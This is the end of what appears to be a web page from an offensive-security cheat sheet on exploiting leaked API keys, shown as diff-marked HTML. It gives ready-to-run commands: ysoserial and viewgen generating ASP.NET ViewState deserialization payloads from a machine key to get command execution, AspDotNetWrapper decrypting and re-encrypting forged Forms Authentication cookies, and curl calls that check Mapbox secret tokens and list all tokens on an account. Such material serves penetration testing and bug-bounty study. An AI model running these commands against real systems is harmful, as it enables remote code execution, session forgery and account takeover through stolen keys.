+</span></span><span style="display:flex;"><span>$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c <span style="color:#e6db74">&#34;C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll&#34;</span> --generator=<span style="color:#e6db74">&#34;CA0B0334&#34;</span> --validationalg=<span style="color:#e6db74">&#34;SHA1&#34;</span> --validationkey=<span style="color:#e6db74">&#34;b07b0f97365416288cf0247cffdf135d25f6be87&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ viewgen --webconfig web.config -m CA0B0334 -c <span style="color:#e6db74">&#34;ping yourdomain.tld&#34;</span>
+</span></span></code></pre></div><h4 id="edit-cookies-with-the-machine-key">
+  Edit cookies with the machine key
+  <a class="anchor" href="#edit-cookies-with-the-machine-key">#</a>
+</h4>
+<p>If you have the machineKey but the viewstate is disabled.</p>
+<p>ASP.net Forms Authentication Cookies : 
+  <a href="https://github.com/liquidsec/aspnetCryptTools">https://github.com/liquidsec/aspnetCryptTools</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># decrypt cookie</span>
+</span></span><span style="display:flex;"><span>$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># encrypt cookie (edit Decrypted.txt)</span>
+</span></span><span style="display:flex;"><span>$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
+</span></span></code></pre></div><h3 id="mapbox-api-token">
+  Mapbox API Token
+  <a class="anchor" href="#mapbox-api-token">#</a>
+</h3>
+<p>A Mapbox API Token is a JSON Web Token (JWT). If the header of the JWT is <code>sk</code>, jackpot. If it&rsquo;s <code>pk</code> or <code>tk</code>, it&rsquo;s not worth your time.</p>
+<pre tabindex="0"><code>#Check token validity
+curl &#34;https://api.mapbox.com/tokens/v2?access_token=YOUR_MAPBOX_ACCESS_TOKEN&#34;
+
+#Get list of all tokens associated with an account. (only works if the token is a Secret Token (sk), and has the appropiate scope)
+curl &#34;https://api.mapbox.com/tokens/v2/MAPBOX_USERNAME_HERE?access_token=YOUR_MAPBOX_ACCESS_TOKEN&#34;
+</code></pre><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d">Finding Hidden API Keys &amp; How to use them - Sumit Jain - August 24, 2019</a></li>
+<li>
+  <a href="https://hackerone.com/reports/376060">Private API key leakage due to lack of access control - yox - August 8, 2018</a></li>
+<li>
+  <a href="https://www.notsosecure.com/project-blacklist3r/">Project Blacklist3r - November 23, 2018 - @notsosecure</a></li>
+<li>
+  <a href="https://www.allysonomalley.com/2020/01/06/saying-goodbye-to-my-favorite-5-minute-p1/">Saying Goodbye to my Favorite 5 Minute P1 - Allyson O&rsquo;Malley - January 6, 2020</a></li>
+<li>
+  <a href="https://docs.mapbox.com/help/troubleshooting/how-to-use-mapbox-securely/">Mapbox API Token Documentation</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/alex-shpak/hugo-book/edit/main/exampleSite/content.en/docs/api_key_leaks.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#api-key-leaks">API Key Leaks</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#exploit">Exploit</a>
+          <ul>
+            <li><a href="#google-maps">Google Maps</a></li>
+            <li><a href="#algolia">Algolia</a></li>
+            <li><a href="#slack-api-token">Slack API Token</a></li>
+            <li><a href="#facebook-access-token">Facebook Access Token</a></li>
+            <li><a href="#github-client-id-and-client-secret">Github client id and client secret</a></li>
+            <li><a href="#twilio-account_sid-and-auth-token">Twilio Account_sid and Auth token</a></li>
+            <li><a href="#twitter-api-secret">Twitter API Secret</a></li>
+            <li><a href="#twitter-bearer-token">Twitter Bearer Token</a></li>
+            <li><a href="#gitlab-personal-access-token">Gitlab Personal Access Token</a></li>
+            <li><a href="#hockeyapp-api-token">HockeyApp API Token</a></li>
+            <li><a href="#iis-machine-keys">IIS Machine Keys</a></li>
+            <li><a href="#mapbox-api-token">Mapbox API Token</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
